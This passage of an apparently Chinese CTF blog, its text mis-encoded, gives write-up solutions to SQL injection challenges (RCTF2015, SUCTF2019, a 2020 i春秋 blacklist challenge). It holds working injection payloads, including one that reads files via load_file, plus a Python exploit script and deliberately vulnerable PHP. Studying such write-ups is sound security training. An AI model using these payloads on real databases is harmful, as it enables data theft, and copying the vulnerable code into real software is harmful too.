class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `user` set `address`='"</span><span class="token operator">.</span><span class="token variable">$address</span><span class="token operator">.</span><span class="token string double-quoted-string">"', `old_address`='"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' where `user_id`="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"è®¢å•ä¿®æ”¹æˆåŠŸ"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æœªæ‰¾åˆ°è®¢å•!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ä¿¡æ¯ä¸å…¨"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>address</code>å¹¶æ²¡æœ‰è¿‡æ»¤é»‘åå•ï¼Œåªä½¿ç”¨äº†ä¸€ä¸ª<code>addslashes</code>å‡½æ•°é™åˆ¶ï¼Œåœ¨updateçš„æ—¶å€™ï¼Œç›´æ¥å°†<code>address</code>å–å‡ºæ¥å°†å…¶ç½®ä¸º<code>old_address</code>ï¼Œé€ æˆäºŒæ¬¡æ³¨å…¥ï¼Œå¹¶ä¸”åé¢æœ‰<code>print_r($db-&gt;error);</code>å°†æŠ¥é”™ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œäºæ˜¯åˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼Œpayloadå¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">POST &#x2F;change.php HTTP&#x2F;1.1Host: 1251682b-93a6-4e1c-af18-c5847f900f36.node3.buuoj.cnuser_name&#x3D;admin&amp;phone&#x3D;111&amp;address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#POST &#x2F;change.php HTTP&#x2F;1.1Host: 1251682b-93a6-4e1c-af18-c5847f900f36.node3.buuoj.cnuser_name&#x3D;admin&amp;phone&#x3D;111&amp;address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</code></pre><h3 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h3><p>æ‰“å¼€é¢˜ç›®å‘ç°æœ‰ç™»å½•æ³¨å†Œä¸¤ä¸ªç•Œé¢</p><p>æ³¨å†Œç•Œé¢çš„usernameè¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œç©ºæ ¼ï¼Œandï¼Œorç­‰</p><p>æ³¨å†Œä¸€ä¸ªç”¨æˆ·è¿›å»åæœ‰ä¸€ä¸ªä¿®æ”¹å¯†ç çš„åŠŸèƒ½ï¼Œå°è¯•æ³¨å†Œ<code>admin\</code>ç”¨æˆ·ï¼Œå†ç™»å½•åä¿®æ”¹å¯†ç ï¼Œå‘ç°æœ‰sqlè¯­æ³•æŠ¥é”™ï¼Œäºæ˜¯æƒ³åˆ°äºŒæ¬¡æ³¨å…¥å’Œçˆ†é”™æ³¨å…¥</p><p>payloadï¼š<code>admin&quot;||(extractvalue(1,concat(1,(reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;)))))))#</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20201020140803308.png" alt loading="lazy"></p><p>expï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://5b2274a0-d780-4303-be2b-eb6066366015.node3.buuoj.cn/"</span>payload1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''Extrader"||(extractvalue(1,concat(1,((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('f'))))))#'''</span>payload2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''Extrader"||(extractvalue(1,concat(1,(reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('f')))))))#'''</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reg</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>        <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"Extrader"</span>    <span class="token punctuation">&#125;</span>    r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"register.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"login.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chapwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'oldpass'</span><span class="token punctuation">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>        <span class="token string">'newpass'</span><span class="token punctuation">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    e <span class="token operator">=</span> r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"changepwd.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    reg<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>    log<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>    chapwd<span class="token punctuation">(</span><span class="token punctuation">)</span>    reg<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>    log<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>    chapwd<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>éœ€è¦æ³¨æ„flagä¸åœ¨flagè¡¨ä¸­ï¼Œåœ¨usersè¡¨ä¸­ï¼ŒæŠ¥é”™å›æ˜¾æœ‰é•¿åº¦é™åˆ¶ï¼Œè¿‡æ»¤äº†leftå’Œrightï¼Œåˆ©ç”¨<code>reverse</code>å°†ç»“æœé€†åºè¾“å‡ºå¯å¾—åˆ°flag</p><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><h3 id="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”blacklist"><a href="#2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”blacklist" class="headerlink" title="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”blacklist"></a>2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”blacklist</h3><p>è¿™ä¸ªé¢˜ç›®å¯å‚è€ƒ  [å¼ºç½‘æ¯ 2019]supersql</p><p>ä¸è¿‡è¿™é¢˜è¿‡æ»¤çš„ä¸œè¥¿è¦å¤šä¸€äº›ï¼Œå¸¸ç”¨çš„ä¸¤ç§æ–¹æ³•ï¼š</p><blockquote><p>é¢„ç¼–è¯‘æ³¨å…¥ç»•è¿‡å…³é”®è¯ï¼šsetã€prepare</p><p>æ”¹è¡¨åä½¿flagæ‰€åœ¨çš„æ•°æ®åº“å˜ä¸ºé¢˜ç›®æŸ¥è¯¢çš„æ•°æ®åº“ï¼šrename ã€alter </p></blockquote><p>éƒ½è¢«è¿‡æ»¤ç”¨ä¸äº†äº†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png" alt loading="lazy"></p><p>è¿™é‡Œå°±ç”¨åˆ°äº†mysqçš„æ–°ç‰¹æ€§<code>handler</code>ï¼Œ<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">è¯¦</a></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">handler</span> FlagHere <span class="token keyword">open</span> <span class="token keyword">as</span> cool<span class="token punctuation">;</span><span class="token keyword">handler</span> cool <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span><span class="token keyword">handler</span> cool <span class="token keyword">read</span> <span class="token keyword">next</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>é€šè¿‡ä»¥ä¸Šè¯­å¥å¯ä»¥å¾—åˆ°flagï¼Œï¼ˆæ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œèµ›åæ²¡æ¥å¾—åŠçœ‹è¿™é¢˜ï¼Œæ—©åœ¨ä¸€ä¸ªå¤šæœˆå‰å­¦é•¿åœ¨ç¾¤é‡Œå‘è¿‡è¿™ä¸ªæ–°ç‰¹æ€§ï¼Œå½“æ—¶å¤ªèœçœ‹ä¸æ‡‚ï¼Œç°åœ¨æƒ³æƒ³å¯æƒœäº† -.-ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png" alt loading="lazy"></p><h3 id="2019SUCTFâ€”EasySQL"><a href="#2019SUCTFâ€”EasySQL" class="headerlink" title="2019SUCTFâ€”EasySQL"></a>2019SUCTFâ€”EasySQL</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>ï¼š</p><ul><li>å †å æ³¨å…¥</li><li>*çš„ä½¿ç”¨</li><li>sql_mode çš„åº”ç”¨</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UyvVse24JRKQZFY.png" alt loading="lazy"></p><p>å¬è¯´æ¯”èµ›çš„æ—¶å€™æ³„éœ²äº†æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">global</span> <span class="token variable">$MysqlLink</span><span class="token punctuation">;</span>    <span class="token comment">//GetPara();</span>    <span class="token variable">$MysqlLink</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$datauser</span><span class="token punctuation">,</span><span class="token variable">$datapass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Mysql Connect Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$selectDB</span> <span class="token operator">=</span> <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$dataName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$selectDB</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Choose Database Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//die();</span>    <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span> Give me your flag, I will tell you if the flag is right. &lt;/ a><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$BlackList</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span><span class="token punctuation">;</span>        <span class="token comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$BlackList</span><span class="token punctuation">&#125;</span></span>/is"</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">//echo $post['query'];</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select "</span><span class="token operator">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"||flag from Flag"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>@<span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span></code></pre><p>mysqli_multi_query()  å‡½æ•°æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚å¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚æœ‰è¿™ä¸ªå‡½æ•°å³å¯æƒ³åˆ°åˆ©ç”¨å †å æ³¨å…¥</p><p>sql_mode æ˜¯ä¸€ç»„mysqlæ”¯æŒçš„åŸºæœ¬è¯­æ³•åŠæ ¡éªŒè§„åˆ™</p><p><strong>mysqlä¸­sql_modeå€¼ä¸¾ä¾‹ï¼š</strong> </p><p><strong>STRICT_TRANS_TABLESï¼š</strong> </p><blockquote><p>mysqlå­˜å‚¨å¼•æ“çš„æ¦‚å¿µ<br>innodbå­˜å‚¨å¼•æ“ï¼ˆoltpç³»ç»Ÿï¼‰<br>myisamå­˜å‚¨å¼•æ“ï¼ˆéå®æ—¶äº¤æ˜“ï¼‰<br>å¯¹äºinnodbå­˜å‚¨å¼•æ“æ¥è¯´å½“è®¾ç½®sql_modeæœ‰è¯¥å€¼æ˜¯ï¼Œå½“å‘ç°æ’å…¥æ•°æ®æ— æ³•æ­£å¸¸æ’å…¥ï¼Œä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å›æ»šæ‰€æœ‰å‚æ•°ï¼ˆåŠ å…¥ä¸€ä¸ªæ’å…¥æ“ä½œå¾€æ•°æ®è¡¨ä¸­æ’å…¥10è¡Œæ•°æ®ï¼Œä½†æ˜¯åœ¨ç¬¬äº”è¡Œæ•°æ®ä¸èƒ½æ’å…¥ï¼Œæ­¤æ—¶ä¼šç»ˆæ­¢æ’å…¥æ“ä½œå¹¶ä¸”ä¼šå›æ»šæ’å…¥æˆåŠŸçš„æ•°æ®ï¼‰<br>å¯¹äºmyisamå­˜å‚¨å¼•æ“ï¼šå½“æ’å…¥æ•°æ®æ˜¯ç¬¬ä¸€è¡Œæ— æ³•æ’å…¥æ—¶ï¼ŒæŠ¥é”™å¹¶ä¸”å›æ»šæ’å…¥æ•°æ®å½“æ’å…¥çš„æ•°æ®ä¸æ˜¯ç¬¬ä¸€è¡Œæ— æ³•æ’å…¥æ—¶ï¼Œæ­¤æ—¶mysqlæ•°æ®åº“ä¼šå°†æ— æ³•æ’å…¥çš„å€¼è½¬æ¢ä¸ºè¿‘ä¼¼å€¼æˆ–è€…å‘ç”Ÿéšå¼ç±»å‹è½¬æ¢ï¼Œå¹¶ä¸”ä¸ä¼šæŠ¥é”™ </p></blockquote><p><strong>STRICT_ALL_TABLESï¼š</strong> </p><blockquote><p>å¯¹äºinnodbå­˜å‚¨å¼•æ“ä½œç”¨ä¸€è‡´<br>å¯¹äºmyisamå­˜å‚¨å¼•æ“ï¼šå½“æ’å…¥ä¸æ˜¯ç¬¬ä¸€è¡ŒæŠ¥é”™æ—¶ï¼Œä¼šå°†æŠ¥é”™ä¹‹å‰çš„æ•°æ®ä¿ç•™ï¼Œç»ˆæ­¢ä¹‹åçš„æ’å…¥æ“ä½œ </p></blockquote><p><strong>NO_ENGINE_SUBSTITUTIONï¼š</strong> </p><blockquote><p>å½“å­˜å‚¨å¼•æ“è¢«ç¦æ­¢æˆ–è€…æœªè§£ææ—¶ï¼Œå½“ä½¿ç”¨æ—¶ä¼šæŠ¥é”™ </p></blockquote><p><strong>only_for_group_byï¼š</strong> </p><blockquote><p>å½“selectå­—å¥ä¸­å‡ºç°çš„å•ç‹¬åˆ—æ²¡æœ‰å‡ºç°åœ¨group byå­—å¥ä¸­ï¼Œæ­¤æ—¶å°±ä¼šæŠ¥é”™ </p></blockquote><p><strong>NO_AUTO_CREATE_USER:</strong> </p><blockquote><p>ç¦æ­¢åˆ›å»ºå¯†ç ä¸ºç©ºçš„ç”¨æˆ· </p></blockquote><p><strong>NO_ZERO_IN_DATEï¼š</strong> </p><blockquote><p>åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œä¸å…è®¸æ—¥æœŸå’Œæœˆä»½ä¸ºé›¶ </p></blockquote><p><strong>NO_ZERO_DATEï¼š</strong> </p><blockquote><p>è®¾ç½®è¯¥å€¼ï¼Œmysqlæ•°æ®åº“ä¸å…è®¸æ’å…¥é›¶æ—¥æœŸï¼Œæ’å…¥é›¶æ—¥æœŸä¼šæŠ›å‡ºé”™è¯¯è€Œä¸æ˜¯è­¦å‘Š </p></blockquote><p><strong>ERROR_FOR_DIVISION_BY_ZEROï¼š</strong> </p><blockquote><p>åœ¨INSERTæˆ–UPDATEè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ•°æ®è¢«é›¶é™¤ï¼Œåˆ™äº§ç”Ÿé”™è¯¯è€Œéè­¦å‘Šã€‚å¦‚æœæœªç»™å‡ºè¯¥æ¨¡å¼ï¼Œé‚£ä¹ˆæ•°æ®è¢«é›¶é™¤æ—¶MySQLè¿”å›NULL </p></blockquote><p><strong>NO_AUTO_CREATE_USERï¼š</strong> </p><blockquote><p>ç¦æ­¢GRANTè¯­å¥åˆ›å»ºå¯†ç ä¸ºç©ºçš„ç”¨æˆ· </p></blockquote><p><strong>PIPES_AS_CONCATï¼š</strong> </p><blockquote><p>å°†â€œ||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼ï¼ˆæœ¬é¢˜è¦ç‚¹ï¼‰ </p></blockquote><p><strong>ANSI_QUOTESï¼š</strong> </p><blockquote><p>å¯ç”¨ANSI_QUOTESåï¼Œä¸èƒ½ç”¨åŒå¼•å·æ¥å¼•ç”¨å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«è§£é‡Šä¸ºè¯†åˆ«ç¬¦</p></blockquote><p>äºæ˜¯æœ‰æ³¨å…¥è¯­å¥ï¼š</p><pre class="language-mssql" data-language="mssql"><code class="language-mssql">1;set sql_mode&#x3D;PIPES_AS_CONCAT;SELECT 1</code></pre><p>æ‹¼åˆèµ·æ¥å°±æ˜¯ï¼š</p><pre><code>select 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1||flag from Flag</code></pre><p>æ­¤æ—¶çš„select 1||flag from Flagå°±ç­‰åŒäºselect 1 from Flagå’Œselect flag from Flagçš„æ‹¼åˆ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/e6sQR1uwh3UA9v5.png" alt loading="lazy"></p><p>å¦å¤–è¿˜æœ‰ä¸€ä¸ªè§£å°±æ˜¯*çš„ç”¨æ³•ï¼š</p><p>æ³¨å…¥ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">*,1</code></pre><p>æ‹¼åˆèµ·æ¥å°±æ˜¯ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select *,1||flag from Flag</code></pre><p>*ä¸ºæŸ¥è¯¢æ‰€æœ‰ï¼Œæ­¤æ—¶çš„select *,1||flag from Flagå°±ç­‰åŒäºselect * from Flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xLgmrQAq4CXcp2G.png" alt loading="lazy"></p><h3 id="2019å¼ºç½‘æ¯â€”supersql"><a href="#2019å¼ºç½‘æ¯â€”supersql" class="headerlink" title="2019å¼ºç½‘æ¯â€”supersql"></a>2019å¼ºç½‘æ¯â€”supersql</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€”å †å æ³¨å…¥ï¼›è¯¦è§å¤§ä½¬åšå®¢ï¼š<a 